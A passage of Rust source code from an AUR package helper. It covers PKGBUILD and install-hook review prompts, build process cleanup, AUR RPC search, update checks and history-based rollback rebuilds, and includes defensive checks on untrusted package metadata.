                    file.bytes,
                    file.digest
                ),
            ));
        }
    } else {
        let preview = preview_pkgbuild_lines(trimmed, MAX_PKGBUILD_PREVIEW_LINES);
        for (number, line) in preview {
            lines.push(chrome::snippet_line(
                number,
                &chrome::truncate_chars(&line, PREVIEW_LINE_CHARS),
            ));
        }
        lines.push(chrome::rail_line(""));
        lines.push(chrome::rail_line(&format!(
            "{} of {total_lines} lines · remaining source hashed, not printed",
            MAX_PKGBUILD_PREVIEW_LINES.min(total_lines)
        )));
        lines.push(chrome::rail_line("omg -v dumps the full PKGBUILD"));
        lines.push(chrome::rail_line(
            "user-submitted · digest seals every reviewed file",
        ));
    }

    // Pacman executes declared install hooks as root after the unprivileged
    // build, so their contents belong in the approval decision, not just
    // their digests. The archived .INSTALL is later byte-checked against
    // these reviewed bytes before any root installation.
    for (name, contents) in install_hooks {
        lines.push(chrome::rail_line(""));
        lines.push(chrome::kv("hook", &review_path(Path::new(name))));
        for (number, line) in contents.lines().enumerate() {
            lines.push(chrome::snippet_line(number + 1, line));
        }
    }

    lines.join("\n")
}

fn pkgbuild_review_prompt(package: &str) -> String {
    let package = crate::cli::style::sanitize_terminal_text(package);
    format!("Build {package} from this PKGBUILD?")
}

/// Every `.SRCINFO`-declared install script with its reviewed contents,
/// rendered for the approval panel. These hooks run as root during the
/// privileged install, so approval must cover their bytes (csf_b6e85633),
/// and the archived `.INSTALL` is byte-checked against the same reviewed
/// bytes before installation.
fn declared_install_hook_previews(source: &ReviewedSource) -> Result<Vec<(String, String)>> {
    let mut names: Vec<String> = Vec::new();
    {
        let srcinfo = source.text(Path::new(".SRCINFO"))?;
        for line in srcinfo.lines() {
            let Some((key, value)) = line.split_once('=') else {
                continue;
            };
            let value = value.trim();
            if key.trim() == "install"
                && !value.is_empty()
                && !names.iter().any(|name| name == value)
            {
                names.push(value.to_owned());
            }
        }
    }
    names
        .into_iter()
        .map(|name| {
            let display_name = review_path(Path::new(&name));
            let bytes = source
                .files
                .get(Path::new(&name))
                .with_context(|| format!("Declared install hook is absent: {display_name}"))?;
            anyhow::ensure!(
                bytes.len() <= MAX_PKGBUILD_REVIEW_BYTES,
                "Install hook {display_name} exceeds the review limit"
            );
            let text = std::str::from_utf8(bytes)
                .with_context(|| format!("Install hook {display_name} is not UTF-8"))?;
            // Make control/bidi bytes visible instead of silently removing them.
            let contents = text
                .chars()
                .map(|character| {
                    if character != '\n'
                        && (character.is_control()
                            || matches!(character, '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}'))
                    {
                        character.escape_default().to_string()
                    } else {
                        character.to_string()
                    }
                })
                .collect::<String>();
            Ok((name, contents))
        })
        .collect()
}

#[cfg(test)]
fn pkgbuild_review_summary(package: &str, digest: &str, file_count: usize) -> String {
    use crate::cli::chrome;
    let package = crate::cli::style::sanitize_terminal_text(package);
    let short = if digest.len() > 12 {
        format!("{}…", &digest[..12])
    } else {
        digest.to_string()
    };
    let files = if file_count == 1 {
        "1 file".to_string()
    } else {
        format!("{file_count} files")
    };
    if crate::cli::style::colors_enabled() {
        format!(
            "  {}  {}  {package}  {}  {files}",
            chrome::accent_rail(),
            "AUR".bold(),
            short.dimmed()
        )
    } else {
        format!("  |  AUR  {package}  {short}  {files}")
    }
}

async fn confirm_prompt(prompt: String, default: bool) -> Result<bool> {
    Ok(tokio::task::spawn_blocking(move || {
        Confirm::with_theme(&crate::cli::ui::prompt_theme())
            .with_prompt(prompt)
            .default(default)
            .interact()
    })
    .await
    .context("PKGBUILD review prompt task failed")??)
}

struct BuildLog {
    file: tokio::fs::File,
    bytes: u64,
    limit: u64,
}

#[derive(Clone, Copy)]
enum BuildIsolation {
    ProcessGroup,
    NativeSession,
}

struct BuildProcess {
    child: Option<tokio::process::Child>,
    group: u32,
    reaper: tokio::runtime::Handle,
}

impl BuildProcess {
    fn terminate(&mut self) -> Result<()> {
        // Stop the launcher first: native setsid may not have established the
        // session yet. Once killed, it cannot create descendants after killpg.
        let launcher_result = self.child.as_mut().map_or(Ok(()), |child| {
            child
                .start_kill()
                .context("Failed to stop AUR build launcher")
        });
        let group_result = terminate_build_group(self.group);
        launcher_result?;
        group_result
    }

    async fn terminate_and_reap(&mut self) -> Result<()> {
        self.terminate()?;
        if let Some(child) = &mut self.child {
            child.wait().await.context("Failed to reap AUR build")?;
        }
        self.child = None;
        Ok(())
    }
}

impl Drop for BuildProcess {
    fn drop(&mut self) {
        if self.child.is_none() {
            return;
        }
        if let Err(error) = self.terminate() {
            tracing::warn!(%error, "Failed to terminate cancelled AUR build");
        }
        if let Some(mut child) = self.child.take() {
            // Caller cancellation cannot await here. Keep the Child owned by a
            // reap task instead of relying only on Tokio's best-effort Drop.
            self.reaper.spawn(async move {
                if let Err(error) = child.wait().await {
                    tracing::warn!(%error, "Failed to reap cancelled AUR build");
                }
            });
        }
    }
}

fn terminate_build_group(group: u32) -> Result<()> {
    use nix::errno::Errno;
    use nix::sys::signal::{Signal, killpg};
    use nix::unistd::Pid;

    let group = i32::try_from(group).context("AUR build process ID exceeded i32")?;
    match killpg(Pid::from_raw(group), Signal::SIGKILL) {
        Ok(()) | Err(Errno::ESRCH) => Ok(()),
        Err(error) => Err(error).context("Failed to terminate AUR build process group"),
    }
}

async fn drain_build_output<R>(
    mut reader: R,
    log: Arc<tokio::sync::Mutex<BuildLog>>,
    stream: BuildOutputStream,
    verbose: bool,
) -> std::io::Result<()>
where
    R: AsyncRead + Unpin,
{
    let mut buffer = [0_u8; 16 * 1024];
    let mut terminal_writable = verbose;
    let mut stdout = tokio::io::stdout();
    let mut stderr = tokio::io::stderr();

    loop {
        let read = reader.read(&mut buffer).await?;
        if read == 0 {
            break;
        }
        let chunk = &buffer[..read];

        {
            let mut log = log.lock().await;
            let next = log
                .bytes
                .checked_add(read as u64)
                .ok_or_else(|| std::io::Error::other("AUR build log byte count overflowed"))?;
            if next > log.limit {
                return Err(std::io::Error::other(
                    "AUR build log exceeded its byte limit",
                ));
            }
            log.file.write_all(chunk).await?;
            log.bytes = next;
        }

        if terminal_writable {
            let result = match stream {
                BuildOutputStream::Stdout => stdout.write_all(chunk).await,
                BuildOutputStream::Stderr => stderr.write_all(chunk).await,
            };
            if result.is_err() {
                // A closed output consumer must not stop us draining the child.
                terminal_writable = false;
            }
        }
    }

    Ok(())
}

#[derive(Debug, Deserialize)]
struct AurResponse {
    results: Vec<AurJsonPackage>,
}

/// Request diagnostics safe to retain without remote text or transport URLs.
#[derive(Debug, thiserror::Error)]
enum AurRpcRequestError {
    #[error("AUR RPC request to {AUR_RPC_URL} returned HTTP {0}")]
    Http(reqwest::StatusCode),
    #[error("AUR RPC transport failed. Check your internet connection.")]
    Transport,
}

fn ensure_aur_rpc_success(status: reqwest::StatusCode) -> Result<()> {
    anyhow::ensure!(status.is_success(), AurRpcRequestError::Http(status));
    Ok(())
}

fn decode_aur_rpc_body<T: DeserializeOwned>(body: &[u8]) -> Result<T> {
    let value: serde_json::Value =
        serde_json::from_slice(body).context("Failed to parse AUR RPC response")?;
    if value.get("type").and_then(serde_json::Value::as_str) == Some("error") {
        let detail = value
            .get("error")
            .and_then(serde_json::Value::as_str)
            .filter(|message| !message.trim().is_empty())
            .unwrap_or("unknown AUR RPC error");
        anyhow::bail!("AUR RPC returned an error: {detail}");
    }

    serde_json::from_value(value).context("Failed to parse AUR RPC response")
}

async fn decode_aur_rpc_response<T: DeserializeOwned>(response: reqwest::Response) -> Result<T> {
    ensure_aur_rpc_success(response.status())?;
    let body = crate::core::http::bounded_metadata_body(response)
        .await
        .map_err(|error| match error.downcast::<reqwest::Error>() {
            Ok(error) => redact_aur_transport_error(error),
            Err(error) => error,
        })?;
    decode_aur_rpc_body(&body)
}

fn redact_aur_transport_error(_: reqwest::Error) -> anyhow::Error {
    AurRpcRequestError::Transport.into()
}

async fn finish_metadata_read(
    worker: tokio::task::JoinHandle<Result<Option<AurIndex>>>,
) -> Option<AurIndex> {
    match worker.await {
        Ok(Ok(index)) => index,
        Ok(Err(error)) => {
            warn!("Failed to open fresh AUR metadata: {error:#}");
            None
        }
        Err(error) => {
            warn!("AUR metadata freshness worker failed: {error}");
            None
        }
    }
}

impl AurClient {
    pub fn new() -> Result<Self> {
        let settings = Settings::load().context("Failed to load OMG settings for AUR")?;
        let build_dir = paths::cache_dir().join("aur");

        Ok(Self {
            build_dir,
            settings,
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        })
    }

    /// This inode must survive removal and recreation of the build tree.
    fn open_lifecycle_lock(&self) -> Result<File> {
        use std::os::unix::fs::{MetadataExt, OpenOptionsExt};

        let lock_path = self.build_dir.with_added_extension("lifecycle.lock");
        let parent = lock_path
            .parent()
            .context("AUR build directory has no parent")?;
        create_dir_as_user_sync(parent)?;
        let mut options = std::fs::OpenOptions::new();
        options
            .read(true)
            .write(true)
            .mode(0o600)
            .custom_flags(nix::libc::O_NOFOLLOW | nix::libc::O_NONBLOCK);
        let (file, created) = match options.create_new(true).open(&lock_path) {
            Ok(file) => (file, true),
            Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {
                (options.create_new(false).open(&lock_path)?, false)
            }
            Err(error) => {
                return Err(error).with_context(|| {
                    format!("Failed to open AUR lifecycle lock {}", lock_path.display())
                });
            }
        };
        let metadata = file.metadata()?;
        anyhow::ensure!(
            metadata.is_file() && metadata.nlink() == 1,
            "AUR lifecycle lock must be a single-link regular file"
        );
        if let Some(user) = original_user() {
            let account = nix::unistd::User::from_name(&user)?
                .with_context(|| format!("Original user '{user}' has no system account"))?;
            if created {
                nix::unistd::fchown(&file, Some(account.uid), Some(account.gid))
                    .context("Failed to set AUR lifecycle lock ownership")?;
            } else {
                anyhow::ensure!(
                    metadata.uid() == account.uid.as_raw(),
                    "Existing AUR lifecycle lock is not owned by the original user"
                );
            }
        }
        Ok(file)
    }

    /// File ownership spans async build work intentionally. Acquisition never
    /// waits, and cleanup never waits for builders, so this cannot block an
    /// executor thread behind a task holding the same lifecycle lock.
    async fn acquire_build_lifecycle(&self) -> Result<File> {
        let client = self.clone();
        tokio::task::spawn_blocking(move || {
            let file = client.open_lifecycle_lock()?;
            file.try_lock_shared()
                .context("Failed to acquire AUR build ownership; cleanup may be active")?;
            Ok(file)
        })
        .await
        .context("AUR lifecycle lock worker failed")?
    }

    fn package_base_lock(&self, package_base: &str) -> Arc<tokio::sync::Mutex<()>> {
        Arc::clone(
            self.package_base_locks
                .entry(package_base.to_string())
                .or_insert_with(|| Arc::new(tokio::sync::Mutex::new(())))
                .value(),
        )
    }

    fn package_base_marker(package_base: &str) -> String {
        format!("pkgbase:{package_base}")
    }

    async fn acquire_package_base_file_lock(&self, package_base: &str) -> Result<File> {
        let lock_dir = self.build_dir.join("_locks");
        create_dir_as_user(&lock_dir).await?;
        let lock_path = lock_dir.join(format!("{package_base}.lock"));
        self.blocking_build_work(move || -> Result<File> {
            let file = std::fs::OpenOptions::new()
                .create(true)
                .read(true)
                .write(true)
                .truncate(false)
                .open(&lock_path)
                .with_context(|| {
                    format!("Failed to open AUR build lock {}", lock_path.display())
                })?;
            file.lock().with_context(|| {
                format!("Failed to acquire AUR build lock {}", lock_path.display())
            })?;
            Ok(file)
        })
        .await
        .context("AUR build lock worker failed")
    }

    async fn blocking_build_work<T: Send + 'static>(
        &self,
        work: impl FnOnce() -> Result<T> + Send + 'static,
    ) -> Result<T> {
        let lease = self.acquire_build_lifecycle().await?;
        tokio::task::spawn_blocking(move || {
            let _lease = lease;
            work()
        })
        .await
        .context("AUR blocking worker failed")?
    }

    #[must_use]
    pub fn build_concurrency(&self) -> usize {
        self.settings.aur.build_concurrency.max(1)
    }

    async fn fresh_metadata_index(&self) -> Option<AurIndex> {
        if !self.settings.aur.use_metadata_archive {
            return None;
        }

        let ttl = Duration::from_secs(self.settings.aur.metadata_cache_ttl_secs);
        finish_metadata_read(tokio::task::spawn_blocking(move || {
            open_fresh_metadata_index(ttl)
        }))
        .await
    }

    /// Search AUR packages
    pub async fn search(&self, query: &str) -> Result<Vec<Package>> {
        validate_search_query(query)?;

        // Try the binary index only while its source archive is within the
        // configured TTL. Stale indexes fall through to the live RPC.
        if let Some(index) = self.fresh_metadata_index().await {
            let query_owned = query.to_string();
            let result = tokio::task::spawn_blocking(move || -> Result<Vec<Package>> {
                // Install resolution consumes this bounded search: reserve its
                // exact source/binary identities before substring matches fill it.
                let binary_name = format!("{query_owned}-bin");
                let mut entries = Vec::with_capacity(50);
                for name in [query_owned.as_str(), binary_name.as_str()] {
                    if let Some(entry) = index.get(name)? {
                        entries.push(entry);
                    }
                }
                for entry in index.search(&query_owned, 50)? {
                    if entries.len() == 50 {
                        break;
                    }
                    if !entries
                        .iter()
                        .any(|selected| selected.name.as_str() == entry.name.as_str())
                    {
                        entries.push(entry);
                    }
                }
                Ok(entries
                    .into_iter()
                    .filter_map(|entry| {
                        let name = entry.name.as_str();
                        if let Err(error) = validate_index_entry_name(name, None) {
                            warn!("Rejecting AUR index entry '{name}': {error}");
                            return None;
                        }
                        // AUR metadata is an untrusted boundary: a version
                        // that fails the strict parser must not compare as a
                        // fabricated 0 (ARCH-R14); reject the entry visibly.
                        let Some(version) =
                            crate::package_managers::parse_version(entry.version.as_str())
                        else {
                            warn!(
                                "Rejecting AUR index entry '{name}': unparseable version '{}'",
                                entry.version.as_str()
                            );
                            return None;
                        };
                        Some(Package {
                            name: name.to_string(),
                            version,
                            description: entry
                                .description
                                .as_ref()
                                .map(|description| description.as_str().to_string())
                                .unwrap_or_default(),
                            source: PackageSource::Aur,
                            installed: false,
                        })
                    })
                    .collect())
            })
            .await?;

            if let Ok(packages) = result
                && !packages.is_empty()
            {
                return Ok(packages);
            }
        }

        let url = format!(
            "{AUR_RPC_URL}?v=5&type=search&arg={}",
            urlencoding::encode(query)
        );

        let response = shared_client().get(&url).send().await.map_err(|error| {
            let error = redact_aur_transport_error(error);
            tracing::warn!("AUR search network error: {error}");
            error
        })?;
        let response: AurResponse = decode_aur_rpc_response(response).await?;

        let mut packages: Vec<Package> = response
            .results
            .into_iter()
            .filter(|p| {
                crate::core::security::validate_package_name(&p.name)
                    .inspect_err(|e| {
                        tracing::warn!(
                            "Rejecting invalid package name from AUR search: {} ({})",
                            p.name,
                            e
                        );
                    })
                    .is_ok()
            })
            .filter_map(|p| {
                // AUR RPC metadata is an untrusted boundary: a version that
                // fails the strict parser must not compare as a fabricated 0
                // (ARCH-R14); reject the entry visibly.
                let Some(version) = crate::package_managers::parse_version(&p.version) else {
                    tracing::warn!(
                        "Rejecting AUR search result '{}' with unparseable version '{}'",
                        p.name,
                        p.version
                    );
                    return None;
                };
                Some(Package {
                    name: p.name,
                    version,
                    description: p.description.unwrap_or_default(),
                    source: PackageSource::Aur,
                    installed: false,
                })
            })
            .collect();

        // Rank exact, prefix, and word-boundary matches before shorter names.
        // Pre-compute lowercased names to avoid O(n log n) allocations during sort
        let query_lower = query.to_ascii_lowercase();

        // Precompute sort keys: (exact, prefix, word_boundary, name_len, name_lower, original_idx)
        let mut keyed: Vec<_> = packages
            .into_iter()
            .map(|pkg| {
                let name_lower = pkg.name.to_ascii_lowercase();
                let exact = name_lower == query_lower;
                let prefix = name_lower.starts_with(&query_lower);
                let word = has_word_boundary_match(&name_lower, &query_lower);
                (exact, prefix, word, pkg.name.len(), name_lower, pkg)
            })
            .collect();

        // Sort using precomputed keys - no allocations during comparison
        keyed.sort_by(|a, b| {
            // Exact matches first
            if a.0 != b.0 {
                return b.0.cmp(&a.0);
            }
            // Prefix matches second
            if a.1 != b.1 {
                return b.1.cmp(&a.1);
            }
            // Word boundary matches third
            if a.2 != b.2 {
                return b.2.cmp(&a.2);
            }
            // Shorter names (more specific) fourth
            match a.3.cmp(&b.3) {
                std::cmp::Ordering::Equal => a.4.cmp(&b.4), // Alphabetical by lowercase
                other => other,
            }
        });

        // Extract sorted packages
        packages = keyed.into_iter().map(|(_, _, _, _, _, pkg)| pkg).collect();

        Ok(packages)
    }

    /// Get info for a specific AUR package
    pub async fn info(&self, package: &str) -> Result<Option<Package>> {
        // SECURITY: Validate package name
        crate::core::security::validate_package_name(package)?;

        // Try the binary index only while its source archive is fresh.
        if let Some(index) = self.fresh_metadata_index().await {
            let package_owned = package.to_string();
            let result = tokio::task::spawn_blocking(move || -> Result<Option<Package>> {
                if let Some(entry) = index.get(&package_owned)? {
                    validate_index_entry_name(entry.name.as_str(), Some(&package_owned))?;
                    // A corrupt index version must not compare as a fabricated
                    // 0 (ARCH-R14); surface a typed error so the caller falls
                    // back to the live RPC for this package.
                    let version = crate::package_managers::parse_version(entry.version.as_str())
                        .ok_or_else(|| {
                            anyhow::anyhow!(
                                "AUR index entry '{}' has an unparseable version '{}'",
                                entry.name.as_str(),
                                entry.version.as_str()
                            )
                        })?;
                    return Ok(Some(Package {
                        name: entry.name.as_str().to_string(),
                        version,
                        description: entry
                            .description
                            .as_ref()
                            .map(|s| s.as_str().to_string())
                            .unwrap_or_default(),
                        source: PackageSource::Aur,
                        installed: false,
                    }));
                }
                Ok(None)
            })
            .await?;

            match result {
                Ok(Some(package)) => return Ok(Some(package)),
                Ok(None) => {}
                Err(error) => warn!("AUR index lookup failed; falling back to RPC: {error}"),
            }
        }

        let url = format!(
            "{AUR_RPC_URL}?v=5&type=info&arg={}",
            urlencoding::encode(package)
        );

        let response = shared_client().get(&url).send().await.map_err(|error| {
            let error = redact_aur_transport_error(error);
            tracing::warn!("AUR info network error: {error}");
            error
        })?;
        let response: AurResponse = decode_aur_rpc_response(response).await?;

        let Some(p) = response.results.into_iter().next() else {
            return Ok(None);
        };
        crate::core::security::validate_package_name(&p.name)
            .context("AUR returned an invalid package name")?;
        if p.name != package {
            anyhow::bail!(
                "AUR returned unexpected package '{0}' for '{package}'",
                p.name
            );
        }

        // AUR RPC metadata is an untrusted boundary: a version that fails the
        // strict parser must fail the lookup with a typed error instead of
        // comparing as a fabricated 0 (ARCH-R14).
        let version = crate::package_managers::parse_version(&p.version).with_context(|| {
            format!(
                "AUR returned an unparseable version '{}' for '{}'",
                p.version, p.name
            )
        })?;

        Ok(Some(Package {
            name: p.name,
            version,
            description: p.description.unwrap_or_default(),
            source: PackageSource::Aur,
            installed: false,
        }))
    }

    /// Get list of upgradable AUR packages
    /// Queries AUR directly for all non-official packages (like yay/paru)
    #[instrument(skip(self))]
    pub async fn get_update_list(&self) -> Result<Vec<(String, Version, Version)>> {
        // 1. Get all packages not in official repos
        let foreign_packages = tokio::task::spawn_blocking(|| -> Result<Vec<String>> {
            let mut packages = get_potential_aur_packages()?;
            if packages.is_empty() {
                return Ok(packages);
            }
            let config = crate::core::pacman_conf::PacmanConfig::parse(paths::pacman_conf_path())
                .context("Failed to load AUR update filters from pacman.conf")?;
            let ignored = pacman_db::compile_ignore_patterns(&config.ignore_pkg, "IgnorePkg")?;
            packages.retain(|name| !ignored.is_match(name));
            Ok(packages)
        })
        .await
        .context("AUR foreign-package scan task failed")??;

        if foreign_packages.is_empty() {
            return Ok(Vec::new());
        }

        // 2. Try the binary index only while its source archive is fresh.
        // Update discovery never synchronously refreshes global metadata: if
        // the index is stale, absent, unreadable, or errors, fall straight
        // through to the AUR RPC instead.
        if let Some(index) = self.fresh_metadata_index().await {
            let local_names = foreign_packages.clone();
            let result = tokio::task::spawn_blocking(
                move || -> Result<(Vec<(String, Version, Version)>, Vec<String>)> {
                    let mut local_pkgs = Vec::with_capacity(local_names.len());
                    for name in local_names {
                        if let Some(package) = pacman_db::get_local_package(&name)? {
                            local_pkgs.push((name, package.version));
                        }
                    }

                    index.updates_for(&local_pkgs)
                },
            )
            .await?;

            if let Ok((mut updates, missing)) = result {
                if missing.is_empty() {
                    tracing::debug!("AUR update check completed via binary index");
                    return Ok(updates);
                }
                // The index is partially stale: query the RPC for exactly the
                // names it lacks instead of silently treating them as current.
                tracing::debug!(
                    "Binary index missing {} package(s); querying RPC for those",
                    missing.len()
                );
                let rpc_updates = self.query_aur_updates(&missing).await?;
                updates.extend(rpc_updates);
                return Ok(updates);
            }
        }

        // 3. Fallback: Query AUR RPC directly for all foreign packages.
        self.query_aur_updates(&foreign_packages).await
    }

    /// Query AUR RPC for package updates (parallel chunked requests)
    /// Query the AUR RPC `type=info` endpoint for one chunk of package names,
    /// retrying transient failures with exponential backoff.
    async fn rpc_info_chunk(chunk: &[String]) -> Result<AurResponse> {
        Self::rpc_info_chunk_at(AUR_RPC_URL, chunk).await
    }

    async fn rpc_info_chunk_at(endpoint: &str, chunk: &[String]) -> Result<AurResponse> {
        let mut url = format!("{endpoint}?v=5&type=info");
        for name in chunk {
            url.push_str("&arg[]=");
            url.push_str(&urlencoding::encode(name));
        }

        let mut last_error = None;
        for retry in 0..3u32 {
            if retry > 0 {
                tokio::time::sleep(crate::core::http::retry_backoff(
                    Duration::from_millis(100),
                    retry - 1,
                ))
                .await;
            }

            match shared_client().get(&url).send().await {
                Ok(response) => {
                    if crate::core::http::is_retryable_status(response.status()) {
                        last_error = ensure_aur_rpc_success(response.status()).err();
                        continue;
                    }
                    ensure_aur_rpc_success(response.status())?;
                    match crate::core::http::bounded_metadata_body(response).await {
                        Ok(body) => {
                            let response: AurResponse = decode_aur_rpc_body(&body)?;
                            let requested: HashSet<&str> =
                                chunk.iter().map(String::as_str).collect();
                            let mut seen = HashSet::new();
                            for package in &response.results {
                                anyhow::ensure!(
                                    requested.contains(package.name.as_str()),
                                    "AUR RPC info response contained an unrequested package"
                                );
                                anyhow::ensure!(
                                    seen.insert(package.name.as_str()),
                                    "AUR RPC info response contained a duplicate package"
                                );
                            }
                            return Ok(response);
                        }
                        Err(error) => match error.downcast::<reqwest::Error>() {
                            Ok(error) => last_error = Some(redact_aur_transport_error(error)),
                            Err(error) => return Err(error),
                        },
                    }
                }
                Err(error) if crate::core::http::is_retryable_error(&error) => {
                    last_error = Some(redact_aur_transport_error(error));
                }
                Err(error) => return Err(redact_aur_transport_error(error)),
            }
        }
        Err(last_error.unwrap_or_else(|| anyhow::anyhow!("AUR request failed after retries")))
    }

    async fn query_aur_updates(
        &self,
        packages: &[String],
    ) -> Result<Vec<(String, Version, Version)>> {
        self.query_aur_updates_at(AUR_RPC_URL, packages).await
    }

    async fn query_aur_updates_at(
        &self,
        endpoint: &str,
        packages: &[String],
    ) -> Result<Vec<(String, Version, Version)>> {
        let mut updates = Vec::with_capacity(packages.len() / 10 + 1);
        let chunked_names = Self::chunk_aur_names(packages);
        // Network I/O bound - use higher concurrency
        let concurrency = self.settings.aur.build_concurrency.clamp(4, 16);

        let mut stream = futures::stream::iter(chunked_names)
            .map(|chunk| async move { Self::rpc_info_chunk_at(endpoint, &chunk).await })
            .buffer_unordered(concurrency);

        while let Some(res) = stream.next().await {
            let response = res.map_err(|e| {
                // Decoder errors can contain arbitrary server-provided strings.
                // Retain only request causes constructed from safe local data.
                let error = if e.is::<AurRpcRequestError>() {
                    e
                } else {
                    anyhow::anyhow!("AUR RPC response was invalid or reported an error")
                };
                tracing::warn!("AUR update check failed: {}", error);
                error.context("Failed to check AUR updates")
            })?;
            let chunk_updates = tokio::task::spawn_blocking(move || -> Result<Vec<_>> {
                let mut updates = Vec::new();
                for package in response.results {
                    if let Err(error) = crate::core::security::validate_package_name(&package.name)
                    {
                        tracing::warn!(
                            "Rejecting invalid package name from AUR update check: {} ({})",
                            package.name,
                            error
                        );
                        continue;
                    }

                    if let Some(local_package) = pacman_db::get_local_package(&package.name)? {
                        let Some(remote_version) =
                            crate::package_managers::parse_version(&package.version)
                        else {
                            tracing::warn!(
                                "Skipping AUR package '{}' with unparseable version '{}'",
                                package.name,
                                package.version
                            );
                            continue;
                        };
                        if crate::package_managers::types::compare_versions(
                            &remote_version,
                            &local_package.version,
                        ) == std::cmp::Ordering::Greater
                        {
                            updates.push((package.name, local_package.version, remote_version));
                        }
                    }
                }
                Ok(updates)
            })
            .await
            .context("AUR local-version comparison task failed")??;
            updates.extend(chunk_updates);
        }

        Ok(updates)
    }

    #[must_use]
    fn chunk_aur_names(names: &[String]) -> Vec<Vec<String>> {
        let mut chunks: Vec<Vec<String>> = Vec::with_capacity((names.len() / 100) + 1);
        let mut current: Vec<String> = Vec::with_capacity(100);
        let mut current_len = AUR_RPC_INFO_BASE_LEN;

        for name in names {
            // `rpc_info_chunk` percent-encodes every name before appending it
            // to the query string. Account for the wire length, not UTF-8
            // source bytes, or names containing valid `+`/`@` characters can
            // push a supposedly bounded request over the URI limit.
            let arg_len = "&arg[]=".len() + urlencoding::encode(name).len();
            if !current.is_empty() && current_len + arg_len > AUR_RPC_MAX_URI {
                chunks.push(current);
                current = Vec::with_capacity(100);
                current_len = AUR_RPC_INFO_BASE_LEN;
            }
            current_len += arg_len;
            current.push(name.clone());
        }

        if !current.is_empty() {
            chunks.push(current);
        }

        chunks
    }

    pub(crate) async fn build_jobs_for_updates(
        &self,
        packages: &[String],
    ) -> Result<Vec<BuildJob>> {
        if packages.is_empty() {
            return Ok(Vec::new());
        }
        for package in packages {
            crate::core::security::validate_package_name(package)?;
        }

        let mut package_info = Vec::with_capacity(packages.len());
        for chunk in Self::chunk_aur_names(packages) {
            package_info.extend(Self::rpc_info_chunk(&chunk).await?.results);
        }
        Self::build_jobs_from_package_info(packages, &package_info)
    }

    fn build_jobs_from_package_info(
        packages: &[String],
        package_info: &[AurJsonPackage],
    ) -> Result<Vec<BuildJob>> {
        let requested: BTreeSet<&str> = packages.iter().map(String::as_str).collect();
        let mut info_by_name = BTreeMap::new();
        let mut base_by_output = BTreeMap::new();

        for info in package_info {
            crate::core::security::validate_package_name(&info.name)
                .context("AUR returned an invalid split-package name")?;
            let package_base = info.package_base.as_deref().unwrap_or(&info.name);
            crate::core::security::validate_package_name(package_base)
                .context("AUR returned an invalid package base")?;
            info_by_name.insert(info.name.as_str(), info);
            base_by_output.insert(info.name.as_str(), package_base);
        }

        let mut outputs_by_base: BTreeMap<&str, BTreeSet<String>> = BTreeMap::new();
        let mut dependencies_by_base: BTreeMap<&str, BTreeSet<String>> = BTreeMap::new();

        for package in packages {
            let info = info_by_name
                .get(package.as_str())
                .with_context(|| format!("AUR returned no package information for '{package}'"))?;
            let package_base = base_by_output[info.name.as_str()];
            outputs_by_base
                .entry(package_base)
                .or_default()
                .insert(info.name.clone());

            for dependency in info
                .depends
                .iter()
                .chain(info.make_depends.iter())
                .chain(info.check_depends.iter())
                .flatten()
            {
                let dependency = dependency_name(dependency);
                if !requested.contains(dependency) {
                    continue;
                }
                let dependency_base = base_by_output.get(dependency).with_context(|| {
                    format!("AUR returned no package information for dependency '{dependency}'")
                })?;
                if *dependency_base != package_base {
                    dependencies_by_base
                        .entry(package_base)
                        .or_default()
                        .insert((*dependency_base).to_string());
                }
            }
        }

        Ok(outputs_by_base
            .into_iter()
            .map(|(package_base, outputs)| {
                let dependencies = dependencies_by_base
                    .remove(package_base)
                    .unwrap_or_default()
                    .into_iter()
                    .collect();
                BuildJob::for_package_base(
                    package_base.to_string(),
                    outputs.into_iter().collect(),
                    dependencies,
                )
            })
            .collect())
    }

    fn begin_rollback_worktree(work: &Path, base: &str) -> Result<tempfile::TempDir> {
        crate::core::security::validate_package_name(base)?;
        tempfile::Builder::new()
            .prefix(&format!("{base}-"))
            .tempdir_in(work)
            .context("Failed to create owned AUR rollback checkout")
    }

    fn historical_build_failure_message(package: &str, version: &str, log_path: &Path) -> String {
        format!(
            "Historical build of {package} {version} failed; check {}\n  → The AUR may no longer support building this version (changed sources/dependencies)",
            log_path.display()
        )
    }

    /// Rebuild `package` at historical `version` from the AUR repository's
    /// git history and install the resulting archive.
    ///
    /// Used by rollback: officials restore from the pacman cache, but AUR
    /// serves only latest builds, so downgrading requires checking out the
    /// commit whose `.SRCINFO` recorded the old version. The clone is fully
    /// isolated under `_rollback/` so the user's cached checkout is never
    /// touched, and no build-cache key is written (this is not the latest
    /// build).
    pub async fn downgrade_from_history(&self, package: &str, version: &str) -> Result<()> {
        crate::core::security::validate_package_name(package)?;
        crate::core::security::validate_version(version)?;
        require_unprivileged_builder(package, crate::core::is_root())?;

        Self::preacquire_install_privileges(package, "AUR rollback").await?;
        let sudoloop = if crate::core::sudoloop::can_use_sudoloop() {
            Some(crate::core::sudoloop::SudoLoop::start())
        } else {
            None
        };

        let base = self.resolve_package_base(package).await?;

        let _lifecycle_guard = self.acquire_build_lifecycle().await?;

        // The owner removes this unique checkout on every early return or
        // cancellation, not just after a successful install. Logs live outside it.
        let work = self.build_dir.join("_rollback");
        create_dir_as_user(&work).await?;
        let checkout_owner = Self::begin_rollback_worktree(&work, &base)?;
        let repo_dir = checkout_owner.path().to_path_buf();

        let url = format!("{AUR_GIT_URL}/{base}.git");
        super::history::checkout_version(&url, &repo_dir, &base, version).await?;

        // Use the same hardened validation, environment, and sandboxing
        // pipeline as regular installs.
        let pkg_dir = validate_build_dir(
            repo_dir
                .parent()
                .context("rollback work dir must have a parent")?,
            repo_dir
                .file_name()
                .and_then(std::ffi::OsStr::to_str)
                .context("rollback work dir name must be valid UTF-8")?,
        )?;

        let mut env = self.makepkg_env(&pkg_dir).await?;
        // SECURITY (audit F-03, second wave): a force-pushed history commit
        // is exactly as untrusted as a fresh build, and the version match
        // alone does not prove the PKGBUILD is the one originally installed.
        // ALWAYS show the review prompt during rollback rebuilds,
        // independent of the user's day-to-day review preference.
        let pkgbuild_path = pkg_dir.join("PKGBUILD");
        let reviewed_digest =
            Self::review_pkgbuild(package, &pkgbuild_path, self.settings.aur.security_profile)
                .await?;
        set_reproducible_source_epoch(&mut env, &reviewed_digest)?;
        env.pgp_home = Self::fetch_missing_pgp_keys(&pkgbuild_path).await?;
        println!(
            "  {} Building {package} {version} from history...",
            crate::cli::style::informative("→")
        );
